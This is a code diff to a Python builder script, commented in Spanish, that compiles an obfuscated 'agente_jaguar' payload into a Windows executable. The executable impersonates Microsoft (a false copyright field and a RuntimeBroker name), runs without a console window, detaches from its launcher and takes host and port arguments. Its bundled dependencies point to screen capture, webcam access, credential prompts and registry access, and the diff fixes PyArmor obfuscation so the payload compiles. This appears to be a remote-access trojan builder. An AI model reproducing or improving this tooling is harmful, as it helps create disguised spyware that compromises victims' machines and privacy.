@@ -14,6 +14,13 @@ ejecuta desde la carpeta _MEI del padre y muere al borrarla este. Ver _entry().
 FIX 2 (WinError 32): cada build usa una carpeta de trabajo ÚNICA para no chocar
 con el RuntimeBroker.pkg bloqueado de la build anterior (antivirus / instancia
 viva). Además se cierran instancias del payload y se reintenta. Ver generar_exe().
+
+FIX 3 (PyArmor rompe el análisis): PyArmor deja los import dentro del blob
+ofuscado, así que PyInstaller/Nuitka NO los ven (p.ej. "No module named
+'getpass'"). Solución doble y a prueba de futuro:
+  - _entry.py (plano, siempre analizado) hace un "warm-up" de los imports.
+  - si hay PyArmor, se copia el agente SIN ofuscar a agente_deps.py y se pasa
+    como hidden-import; el compilador analiza sus imports recursivamente.
 """
 import os
 import sys
@@ -29,6 +36,11 @@ from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
 
 ES_WIN = sys.platform.startswith("win")
 CREATE_NO_WINDOW = 0x08000000
+
+# Imports que el agente necesita. Se inyectan en _entry.py para que el
+# compilador los vea aunque el agente vaya ofuscado con PyArmor.
+DEPS_STDLIB = ["io", "time", "base64", "socket", "getpass", "platform", "shutil"]
+DEPS_TERCEROS = ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2"]
 
 
 class Constructor:
@@ -168,12 +180,26 @@ class Constructor:
     def _entry(self):
         """_entry.py del .exe.
 
-        El detach (spawn + exit) es necesario para que el payload no quede atado
-        a la consola/lanzador. El punto CRÍTICO es lanzar el hijo con
-        PYINSTALLER_RESET_ENVIRONMENT=1 y sin _PYI_* / _MEIPASS2, para que el
-        bootloader del hijo extraiga su PROPIA carpeta _MEI y no herede la del
-        padre (que este borra al salir).
+        Detach (spawn + exit) para no quedar atado a la consola/lanzador. El
+        hijo se lanza con entorno limpio (PYINSTALLER_RESET_ENVIRONMENT=1 y sin
+        _PYI_* / _MEIPASS2) para que extraiga su PROPIA carpeta _MEI.
+
+        Además, el bloque "warm-up" importa las dependencias del agente en
+        código PLANO: como _entry.py nunca se ofusca, el compilador las ve
+        aunque agente_jaguar esté ofuscado por PyArmor.
         """
+        calentamiento = (
+            "# --- warm-up de imports: visibles para PyInstaller/Nuitka aunque el agente esté ofuscado ---\n"
+            f"import {', '.join(DEPS_STDLIB)}\n"
+            "try:\n"
+            "    import winreg\n"
+            "except Exception:\n"
+            "    pass\n"
+            "try:\n"
+            f"    import {', '.join(DEPS_TERCEROS)}\n"
+            "except Exception:\n"
+            "    pass\n"
+        )
         return (
             "import os, sys, subprocess\n"
             "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
@@ -201,6 +227,7 @@ class Constructor:
             "        close_fds=True)\n"
             "    sys.exit(0)\n"
             "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
+            + calentamiento +
             "import agente_jaguar as agente\n"
             "agente.main()\n"
         )
@@ -290,9 +317,16 @@ class Constructor:
             self._escribir(os.path.join(self.build, "_entry.py"), self._entry())
 
             runtime = None
+            deps = None
             if self.usar_pyarmor:
                 if self._tiene_pyarmor():
                     runtime = self._obfuscar_pyarmor()
+                    if runtime:
+                        # Copia SIN ofuscar para que el compilador analice sus
+                        # imports (PyArmor los oculta en agente_jaguar.py).
+                        shutil.copy2(self.agente, os.path.join(self.build, "agente_deps.py"))
+                        deps = "agente_deps"
+                        self.log("[builder] agente_deps.py -> análisis de dependencias")
                 else:
                     self.log("[builder] PyArmor no instalado -> sigo sin ofuscar")
 
@@ -308,11 +342,11 @@ class Constructor:
             origen = None
             if self.compilador in ("auto", "nuitka"):
                 if self._tiene_nuitka():
-                    origen = self._compilar_nuitka(dist_tmp, work, runtime)
+                    origen = self._compilar_nuitka(dist_tmp, work, runtime, deps)
                 else:
                     self.log("[builder] Nuitka no instalado -> PyInstaller")
             if not origen:
-                origen = self._compilar_pyinstaller(dist_tmp, work, runtime)
+                origen = self._compilar_pyinstaller(dist_tmp, work, runtime, deps)
             if not origen or not os.path.isfile(origen):
                 self.log("[builder] ERROR exe: no se produjo salida")
                 return None
@@ -328,7 +362,7 @@ class Constructor:
             self.log(f"[builder] ERROR exe: {e}")
             return None
 
-    def _nuitka_cmd(self, dist_tmp, extra, runtime):
+    def _nuitka_cmd(self, dist_tmp, extra, runtime, deps):
         cmd = [sys.executable, "-m", "nuitka",
                "--onefile",
                "--assume-yes-for-downloads",
@@ -347,6 +381,11 @@ class Constructor:
                "--copyright=Microsoft Corporation",
                f"--output-filename={self.nombre}.exe",
                f"--output-dir={dist_tmp}"]
+        # Aunque el agente vaya ofuscado, incluimos sus deps explícitamente.
+        for m in DEPS_STDLIB + ["subprocess", "winreg"]:
+            cmd.append(f"--include-module={m}")
+        if deps:
+            cmd.append(f"--include-module={deps}")
         if runtime:
             cmd += [f"--include-package={runtime}",
                     f"--include-package-data={runtime}"]
@@ -379,14 +418,14 @@ class Constructor:
         p.wait()
         return p.returncode, "\n".join(ultimas)
 
-    def _compilar_nuitka(self, dist_tmp, work, runtime):
+    def _compilar_nuitka(self, dist_tmp, work, runtime, deps):
         exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
         intentos = [["--mingw64"]] if self.mingw else [[], ["--mingw64"]]
         for extra in intentos:
             self.log(f"[builder] compilando con Nuitka {extra or '[MSVC]'}... (varios minutos)")
             try:
                 rc, cola = self._correr_stream(
-                    self._nuitka_cmd(dist_tmp, extra, runtime), self.build)
+                    self._nuitka_cmd(dist_tmp, extra, runtime, deps), self.build)
             except Exception as e:
                 self.log(f"[builder] Nuitka excepción: {e}")
                 continue
@@ -395,7 +434,7 @@ class Constructor:
             self.log("[builder] Nuitka falló:\n" + cola[-1500:])
         return None
 
-    def _compilar_pyinstaller(self, dist_tmp, work, runtime, intentos=3):
+    def _compilar_pyinstaller(self, dist_tmp, work, runtime, deps, intentos=3):
         exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
         salida = ""
         for i in range(intentos):
@@ -405,12 +444,14 @@ class Constructor:
                    "--distpath", dist_tmp,
                    "--workpath", work,
                    "--specpath", work,
-                   "--hidden-import", "PIL",
-                   "--hidden-import", "PIL.Image",
-                   "--hidden-import", "PIL.ImageGrab",
-                   "--hidden-import", "cv2",
-                   "--hidden-import", "winreg",
                    "--paths", self.build]
+            # hidden-imports: terceros + stdlib del agente (por si PyArmor
+            # oculta los imports) + módulo de análisis de dependencias.
+            for m in ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2", "winreg"] \
+                    + DEPS_STDLIB + ["subprocess"]:
+                cmd += ["--hidden-import", m]
+            if deps:
+                cmd += ["--hidden-import", deps]
             if runtime:
                 cmd += ["--collect-all", runtime]
             if self.icono and os.path.isfile(self.icono):
